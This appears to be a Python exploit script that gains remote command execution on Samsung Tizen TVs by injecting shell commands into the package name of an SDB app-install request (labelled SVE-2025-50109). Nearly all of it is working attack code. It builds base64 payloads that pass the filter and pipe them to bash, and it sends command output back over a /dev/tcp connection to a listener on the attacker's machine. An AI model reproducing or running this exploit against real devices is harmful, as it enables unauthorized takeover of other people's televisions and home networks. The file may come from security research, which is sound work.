#!/usr/bin/env python3
"""tvrun.py - run a command on the Tizen TV as uid=901(sdk) via the SDB package-name
injection (SVE-2025-50109) and return its output over a /dev/tcp callback.

Usage: tvrun.py "<shell command>"
"""
import base64
import os
import socket
import subprocess
import sys
import threading
import time

TV = os.environ.get("M5_HOST", "192.168.0.50")
TV_PORT = 26101
LISTEN_HOST = os.environ.get("M5_LISTEN_HOST", "0.0.0.0")
HOST_IP = os.environ.get("M5_HOST_IP", "192.168.0.2")
LISTEN_PORT = 0  # assigned dynamically
WORKDIR = os.path.dirname(os.path.abspath(__file__))

sys.path.insert(0, WORKDIR)


def build_injection(command, token):
    """Build the SDB package-name injection that runs `command` on the device.

    The package name is evaluated by the device shell, so a literal '+' or '/'
    in it is fatal.  The payload is plain base64; to make the encoding come
    out clean we shift the base64 alignment by
      * the length of the random token (shifts the whole payload), and
      * a gap of 1-2 spaces inserted at one of the word boundaries of the
        command (shifts everything after that point),
    which is enough of a search space to find a '+'/'/'-free encoding for
    virtually any command.
    """
    import random
    # candidate split points in the command (after a space) for the gap
    splits = [0]
    for i, ch in enumerate(command):
        if ch == " " and len(splits) < 8:
            splits.append(i + 1)
    tail_tpl = "|base64${IFS}-d|bash`.tpk"
    for attempt in range(200000):
        tlen = 8 + (attempt % 24)
        tok = ("%016x" % random.getrandbits(64))[:tlen]
        tail = "%08x" % random.getrandbits(32)
        gap = (attempt // 24) % 2 + 1
        cut = splits[(attempt // 48) % len(splits)]
        cmd = command[:cut] + (" " * gap) + command[cut:]
        script = f"/bin/mkdir /tmp/s-{tok}&&{{ {cmd};:{tail};}}"
        while len(script) % 3:            # avoid base64 '=' padding
            script += " "
        enc = base64.b64encode(script.encode()).decode()
        if "+" in enc or "/" in enc or "=" in enc:
            continue
        name = "n.tpk`printf${IFS}%s${IFS}" + enc + tail_tpl
        if len(name) <= 240:
            return name
    return None


def run_sdb(command, timeout=60):
    from tizen_sdb import sdb_exec

    subprocess.run("pkill -f \"fork-serve[r]\"", shell=True)
    time.sleep(1)
    token = os.urandom(8).hex()
    name = build_injection(command, token)
    if name is None:
        raise RuntimeError("command too long for the package-name injection: " + command[:80])
    arg = "0 appinstall tpk " + name
    return sdb_exec(TV, TV_PORT, arg, wait=timeout)


def main():
    command = sys.argv[1]
    result = {}

    def serve():
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((LISTEN_HOST, 0))
        s.listen(4)
        result["port"] = s.getsockname()[1]
        s.settimeout(60)
        try:
            c, _ = s.accept()
            c.settimeout(25)
            data = b""
            while True:
                try:
                    chunk = c.recv(65536)
                except socket.timeout:
                    break
                if not chunk:
                    break
                data += chunk
            result["data"] = data.decode(errors="replace")
            c.close()
        except socket.timeout:
            result["data"] = ""
        finally:
            s.close()

    t = threading.Thread(target=serve, daemon=True)
    t.start()
    time.sleep(1.2)
    port = result.get("port", 0)
    if os.environ.get("NOCB"):
        inner = f"{command}"
    else:
        inner = (
            f"exec 3<>/dev/tcp/{HOST_IP}/{port};"
            f"{command}>&3"
        )
    # The device only accepts one SDB connection at a time and the app-install
    # injection sometimes gets dropped, so retry until the callback delivers data.
    attempts = 1 if os.environ.get("NOCB") else 4
    for attempt in range(attempts):
        try:
            out = run_sdb(inner, timeout=90)
            print("[sdb]", out[:200], flush=True)
        except Exception as exc:
            print("[sdb-error]", repr(exc), flush=True)
        if os.environ.get("NOCB"):
            print("[nocb] command submitted", flush=True)
            return
        t.join(timeout=30)
        data = result.get("data", "")
        if data.strip():
            print(data)
            return
        print("[retry %d] no data, retrying" % (attempt + 1), flush=True)
        time.sleep(2)
    print(result.get("data", ""))


if __name__ == "__main__":
    main()
